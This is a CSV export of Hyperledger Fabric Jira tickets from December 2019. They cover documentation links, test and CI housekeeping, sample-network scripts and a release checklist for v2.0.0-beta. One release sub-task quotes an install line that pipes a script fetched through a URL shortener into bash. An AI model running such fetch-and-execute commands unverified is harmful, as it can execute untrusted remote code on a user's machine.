 https://github.com/hyperledger/fabric/tree/master/examples/chaincode/go/enccc_example",,denyeart,pandrejko,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17235,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|hzwrrq:65jj",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,pandrejko,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"11/Dec/19 12:43 AM;denyeart;[~pandrejko] In master, shim has moved to repo fabric-chaincode-go, and examples have been removed.

release-1.4 doc should link to release-1.4 fabric repo files.

Then need to verify that the master doc links have been updated accordingly.;;;","04/Jan/20 5:49 AM;pandrejko;I have verified that the link (there is only 1) in the master branch is correct. 
FAB-17235 addresses the content in the release-1.4 branch.
This issue is a duplicate of FAB-17235. Closing. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Broken links in chaincode encryption topic,FAB-17235,43667,,Documentation,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,pandrejko,pandrejko,pandrejko,11/Dec/19 1:48 AM,07/Jan/20 6:53 AM,28/Oct/23 3:09 AM,07/Jan/20 6:53 AM,,,,,,,,,,v1.4.4,,,,fabric-docs,,,,,,,,,0,,,,,,The links to entities extension and encc example are broken at this link: https://hyperledger-fabric.readthedocs.io/en/release-1.4/chaincode4ade.html#chaincode-encryption,,pandrejko,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17234,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|hzwrrq:65jii",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),pandrejko,,,,,,,,,,,,,,release-1.4,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"11/Dec/19 1:50 AM;pandrejko;it still exists in 1.4 - so the 1.4 doc link should not be referencing the master branch
;;;","11/Dec/19 2:18 AM;pandrejko;From Gari:
As to why it was removed, several reasons:
1) we moved Go chaincode out of the Fabric repo for 2.0
2) We set a requirement on Go chaincode to have no external dependencies other than the Fabric protos
3) We really want to remove all of the shim ext stuff ,,, should not be part of Go chaincode as we do not want to maintain unnecessary code (any of the extension stuff should be samples or perhaps their own versioned packages)
4) That code should not be using the bccsp package
5) No one has really asked about it so we had to reason to provide a different example (edited) ;;;","04/Jan/20 5:39 AM;pandrejko;PR: https://github.com/hyperledger/fabric/pull/451;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Rename Tests to Have Descriptive Names,FAB-17236,43670,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,btl5037,scottz,scottz,11/Dec/19 4:36 AM,11/Jan/21 2:31 AM,28/Oct/23 3:09 AM,11/Jan/21 2:31 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"Test names should be descriptive. Since our test targets are now folders we should properly name them. For starters, we should change the name of `regression` to something like `system_test`.

The `system_test` directory should have categorized folders, i.e., `performance`, `load`, `chaos`...

Then `barebones` will reside in `performance` but we will change the name of `barebones` to be something more descriptive, like `simple_performance_regression` (just an example)

 

 ",,btl5037,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-16760,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzzx8zwz2r",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"11/Jan/21 2:08 AM;btl5037;As part of backlog grooming closing issue as stale. Issue can be reopened in the future.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Unit test fails intermittently with Failed connecting to endpoint in merge build,FAB-17237,43675,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Duplicate,,vijaypunugubati,vijaypunugubati,12/Dec/19 12:10 AM,12/Dec/19 12:18 AM,28/Oct/23 3:09 AM,12/Dec/19 12:18 AM,v2.0.0,,,,,,,,,v2.0.0,,,,,,,,,,,,,0,ci-failure,,,,,"Unit test fails intermittently with Failed connecting to endpoint \{""CAs"":null,""Endpoint"":""xxxx""} context deadline exceeded.

*Branch:* Master

*Build link:* [https://dev.azure.com/Hyperledger/0227bd2c-c4f6-478f-be00-ee519f115180/_apis/build/builds/3492/logs/18]

 ",,vijaypunugubati,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-16957,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01657:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),vijaypunugubati,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Refactor couchdb test to start only once for all tests,FAB-17238,43676,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dereckluo,dereckluo,dereckluo,12/Dec/19 12:39 AM,18/Dec/19 8:53 PM,28/Oct/23 3:09 AM,18/Dec/19 8:53 PM,,,,,,,,,,v2.0.0,,,,fabric-ledger,,,,,,,,,0,,,,,,"Refactoring couchdb tests under ./core/ledger, which only starts couchdb
external resources once for all tests. ",,dereckluo,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|hzwqrk:5iwr4rai",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),dereckluo,mastersingh24,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"16/Dec/19 6:45 PM;mastersingh24;[https://github.com/hyperledger/fabric/pull/415];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
What's new links for 2.0,FAB-17239,43683,,Documentation,Closed,FAB,Fabric,software,denyeart,,,High,Done,joe-alewine,joe-alewine,joe-alewine,13/Dec/19 12:14 AM,13/Dec/19 1:55 AM,28/Oct/23 3:09 AM,13/Dec/19 1:55 AM,v2.0.0,,,,,,,,,v2.0.0,,,,fabric-docs,,,,,,,,,0,,,,,,Add links to what's new for 2.0 beta.,,joe-alewine,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i0166j:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),joe-alewine,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"13/Dec/19 12:19 AM;joe-alewine;https://github.com/hyperledger/fabric/pull/401;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Edits to upgrade doc,FAB-17240,43684,,Documentation,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,joe-alewine,joe-alewine,joe-alewine,13/Dec/19 12:23 AM,13/Dec/19 1:48 AM,28/Oct/23 3:09 AM,13/Dec/19 1:48 AM,v2.0.0,,,,,,,,,v2.0.0,,,,fabric-docs,,,,,,,,,0,,,,,,"Fix small typo in upgrade to newest version where the word ""peer"" was omitted.",,joe-alewine,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i0166r:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),joe-alewine,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Updates required for the fabric-samples/test-network scripts,FAB-17241,43685,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,negupta,rameshthoomu,rameshthoomu,13/Dec/19 12:44 AM,14/Dec/19 12:37 AM,28/Oct/23 3:09 AM,14/Dec/19 12:37 AM,v2.0.0,,,,,,,,,v2.0.0,,,,fabric-samples,,,,,,,,,0,,,,,,"Couple of observations made while reviewing the [https://github.com/hyperledger/fabric-samples/pull/80|https://github.com/hyperledger/fabric-samples/pull/80.]

1. ./addOrg3.sh up -c ramesh -s couchdb  (dbtype is not updating the help text). See below

Add org3 to channel 'mychannel' with '10' seconds and CLI delay of '3' seconds and using database 'leveldb'

2. Remove the eyfn.sh reference in addOrg3.sh script.

3. Change the name of this dir (add-Org3). ""add-Org3"" and ""add-org3"" is almost similar and confusing.",,negupta,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i0166z:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),negupta,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"13/Dec/19 4:15 AM;negupta;https://github.com/hyperledger/fabric-samples/pull/85;;;","14/Dec/19 12:36 AM;negupta;Done.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add Readme with setup of instructions for adding an Org3 to the exisitng network (./addOrg3.sh),FAB-17242,43686,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,negupta,rameshthoomu,rameshthoomu,13/Dec/19 12:47 AM,17/Jan/20 7:05 AM,28/Oct/23 3:09 AM,17/Jan/20 7:05 AM,v2.0.0,,,,,,,,,v2.0.0,,,,fabric-samples,,,,,,,,,0,,,,,,addOrg3.sh script will add another Org to the existing network created with ./network.sh script. But I see there is no Readme with set of Instructions how to run addOrg3.sh script.,,negupta,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01677:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),negupta,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"19/Dec/19 12:22 AM;negupta;Addressed with https://github.com/hyperledger/fabric-samples/pull/91;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
addOrg3.sh doesn't support certs generation using fabric-ca,FAB-17243,43687,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,negupta,rameshthoomu,rameshthoomu,13/Dec/19 12:50 AM,17/Jan/20 6:37 AM,28/Oct/23 3:09 AM,17/Jan/20 6:37 AM,v2.0.0,,,,,,,,,v2.0.0,,,,fabric-samples,,,,,,,,,0,,,,,,network.sh script generates crypto material using cryptogen and fabric-ca. But I see addOrg3.sh script generates crypto material using only cryptogen. It's better to add fabric-ca support in addOrg3.sh script.,,negupta,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i0167f:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),negupta,rameshthoomu,,,,,,,,,,,,,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-6.11.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/tough-cookie-4.1.3,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/semver-6.3.1,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/grpc/grpc-js-1.8.17,dependabot/go_modules/high-throughput/application-go/google.golang.org/grpc-1.53.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/word-wrap-1.2.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-and-fabric-network-7.2.4,dependabot/go_modules/asset-transfer-basic/application-go/google.golang.org/grpc-1.53.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"19/Dec/19 12:22 AM;negupta;Addressed with https://github.com/hyperledger/fabric-samples/pull/91;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Remove Fabric-Baseimage References in master,FAB-17244,43691,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,btl5037,btl5037,13/Dec/19 4:12 AM,19/Apr/20 1:21 PM,28/Oct/23 3:09 AM,19/Apr/20 1:21 PM,,,,,,,,,,v2.0.0,,,,,,,,,,,,,0,help-wanted,hygiene,,,,"We no longer use baseimage, there are two legacy variables that should be audited for usage and removed:

Makefile
Line-48:BASEIMAGE_RELEASE = 0.4.16

docker-env.mk
Line-27:BASE_DOCKER_TAG=$(ARCH)-$(BASEIMAGE_RELEASE)

 ",,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i0168b:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Cut v2.0.0-beta release,FAB-17245,43692,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,denyeart,denyeart,denyeart,13/Dec/19 4:13 AM,19/Apr/20 1:20 PM,28/Oct/23 3:09 AM,19/Apr/20 1:20 PM,,,,,,,,,,v2.0.0,,,,fabric-release,,,,,,,,,0,,,,,,"Prepare and publish the release of Hyperledger Fabric. The tasks are listed in execution order and I have indicated any dependencies in the description of each.

 ",,ChristopherFerris,denyeart,JonathanLevi,mastersingh24,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-14986,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|i0168j:",,,,,,,,,,,,,,,,,,,,ChristopherFerris,denyeart,JonathanLevi,mastersingh24,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
[CI] - verify release jobs are ready,FAB-17246,43693,43692,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,btl5037,rameshthoomu,denyeart,13/Dec/19 4:13 AM,13/Dec/19 4:26 AM,28/Oct/23 3:09 AM,13/Dec/19 4:26 AM,,,,,,,,,,,,,,fabric-ci,fabric-release,,,,,,,,0,fabric-ci,,,,,Make sure all the release jobs are ready for release.,,ChristopherFerris,denyeart,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|i0168r:",,,,,,,,,,,,,,,,,,,,ChristopherFerris,denyeart,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Release fabric v2.0.0-beta,FAB-17247,43694,43692,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,denyeart,ChristopherFerris,denyeart,13/Dec/19 4:13 AM,13/Dec/19 5:50 AM,28/Oct/23 3:09 AM,13/Dec/19 5:50 AM,,,,,,,,,,,,,,fabric-release,,,,,,,,,0,,,,,,"*MUST BE REBASED JUST BEFORE MERGING*

*----------*

{\{git checkout master }}

{{git pull}}

_*checkout the CR from Gerrit - be sure you have latest!!!*_ 

{{git checkout -b <newbranch>}}

{\{git rebase master }}

git commit --amend

*_make a tweak to commit message_*

git review

 

Check for clean CI passes

merge

----------------------

Changes

----------------------------

Update bootstrap.sh for latest baseimage:

export THIRDPARTY_IMAGE_VERSION=0.4.13

 

Update Makefile

{{BASE_VERSION}}
 {{PREV_VERSION}}

EXPERIMENTAL ?= false

 
 Update docs/source/install.rst 

e.g. 
 curl -sSL [https://goo.gl/6wtTN5] | bash -s 1.3.0-rc1--
  

grep code for last release number or rc1, ensure all other references updated.

{{release_notes/v1.3.0.txt should be created}}

{{docs/source/releases.rst should be updated with prose and link to GH release page}}

Update hard coded release version in cryptogen, configtxgen, configtxlator, idemixgen binaries, e.g. *common/tools/configtxlator/metadata/metadata.go* (try to resolve this in the future)

{{change log should be generated just *after* *rebasing* to pick up the last minute merged CRs and linked from docs/source/releases.rst}}

./scripts/changelog.sh v1.3.0-rc1 v1.3.0",,ChristopherFerris,denyeart,luomin,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|i0168z:",,,,,,,,,,,,,,,,,,,,ChristopherFerris,denyeart,luomin,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Prepare fabric for next release,FAB-17248,43695,43692,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,denyeart,ChristopherFerris,denyeart,13/Dec/19 4:13 AM,13/Dec/19 6:41 AM,28/Oct/23 3:09 AM,13/Dec/19 6:41 AM,,,,,,,,,,,,,,fabric-release,,,,,,,,,0,,,,,,"Note that this change must be stacked on the previous CR to prepare for the v1.4.0-rc1 release.

Update Makefile

BASE_VERSION = 1.4.0-rc1

PREV_VERSION = 1.3.0

 

Also, update master branch to have BASE_VERSION=1.4.0

Note: Release should be tagged prior to merging this ""prepare for next CR"".",,ChristopherFerris,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|i01697:",,,,,,,,,,,,,,,,,,,,ChristopherFerris,denyeart,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Verify images are published,FAB-17251,43698,43692,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,btl5037,rameshthoomu,denyeart,13/Dec/19 4:13 AM,13/Dec/19 6:25 AM,28/Oct/23 3:09 AM,13/Dec/19 6:25 AM,,,,,,,,,,,,,,fabric-ci,fabric-release,,,,,,,,0,,,,,,"Verify fabric, fabric-ca docker images are published to hyperledger docker-hub account and make sure fabric-binaries are published to nexus repository.",,ChristopherFerris,denyeart,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|i0169v:",,,,,,,,,,,,,,,,,,,,ChristopherFerris,denyeart,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Release (tag) fabric-samples,FAB-17255,43702,43692,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,denyeart,denyeart,denyeart,13/Dec/19 4:13 AM,19/Apr/20 1:19 PM,28/Oct/23 3:09 AM,19/Apr/20 1:19 PM,,,,,,,,,,,,,,fabric-samples,,,,,,,,,0,,,,,,"Tag fabric-samples v2.0.0-alpha.

Note, tagging is really not necessary for fabric-samples alpha, but would be nice to maintain consistency with other repos and indicate when the node sdk token samples that go with fabric v2.0.0-alpha features is all merged and ready for people to use.",,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i016ar:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Pin fabric-samples in master to ""unstable""",FAB-17256,43703,43692,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,denyeart,denyeart,denyeart,13/Dec/19 4:13 AM,19/Apr/20 1:19 PM,28/Oct/23 3:09 AM,19/Apr/20 1:19 PM,,,,,,,,,,,,,,fabric-samples,,,,,,,,,0,,,,,,"Pin fabric-samples in master to ""unstable"" so that latest node modules get used by default.",,denyeart,MHBauer,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i016az:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,MHBauer,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Tag all repositories,FAB-17257,43704,43692,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,denyeart,ChristopherFerris,denyeart,13/Dec/19 4:13 AM,19/Apr/20 1:19 PM,28/Oct/23 3:09 AM,19/Apr/20 1:19 PM,,,,,,,,,,,,,,fabric-release,,,,,,,,,0,,,,,,"*NOTE:* depends on preceding related CRs being merged.

Tag each repository local clone with the release_notes/v1.2.0.txt as the tag comment

% git tag -a v1.4.0-rc1 -F release_notes/v1.4.0-rc1.txt

{{% git push origin v1.4.0-rc1 HEAD:refs/heads/master}}

Tag each of fabric, fabric-ca , fabric-chaincode-java, fabric-chaincode-node, fabric-samples (use v1.4.0-rc1).

 
----
Note, that one can also tag the repo at a specific commit-level.

NOTE *e4b4704 should be updated with latest commit sha*

E.g., to add the {color:#f79232}*v1.4.0-rc1*{color} tag at commit level {color:#205081}*e4b4704*{color}, I used

{{% git tag -a *{color:#f79232}v1.4.0-rc1{color} {color:#205081}e4b4704{color}* -F release_notes/v1.4.0-rc1.txt}}

 

 ",,ChristopherFerris,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|i016b7:",,,,,,,,,,,,,,,,,,,,ChristopherFerris,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Test download of release artifacts and samples across all platforms,FAB-17258,43705,43692,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,denyeart,ChristopherFerris,denyeart,13/Dec/19 4:14 AM,13/Dec/19 6:26 AM,28/Oct/23 3:09 AM,13/Dec/19 6:26 AM,,,,,,,,,,,,,,fabric-release,,,,,,,,,0,,,,,,test download of release artifacts and samples across all platforms,,ChristopherFerris,denyeart,harrijk,rameshthoomu,vijaypunugubati,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|i016bf:",,,,,,,,,,,,,,,,,,,,ChristopherFerris,denyeart,harrijk,rameshthoomu,vijaypunugubati,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Send email to hyperledger-fabric mailing list,FAB-17259,43706,43692,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,denyeart,ChristopherFerris,denyeart,13/Dec/19 4:14 AM,19/Apr/20 1:19 PM,28/Oct/23 3:09 AM,19/Apr/20 1:19 PM,,,,,,,,,,,,,,fabric-release,,,,,,,,,0,,,,,,send email announcing the release to hyperledger-fabric@lists.hyperledger.org mailing list.,,ChristopherFerris,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|i016bn:",,,,,,,,,,,,,,,,,,,,ChristopherFerris,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Document CouchDB release compatibility,FAB-17260,43712,,Documentation,Backlog,FAB,Fabric,software,denyeart,,,Medium,,,denyeart,denyeart,14/Dec/19 12:00 AM,12/Mar/20 7:58 PM,28/Oct/23 3:09 AM,,,,,,,,,,,v1.4.7,v2.0.0,,,fabric-docs,fabric-ledger,,,,,,,,0,,,,,,"Add CouchDB release compatibility to Fabric documentation. Currently it says that Fabric v1.4.x has been tested against CouchDB 2.2. But an incompatible change in CouchDB 2.3 requires upgrade to Fabric peer v1.4.1 or later.

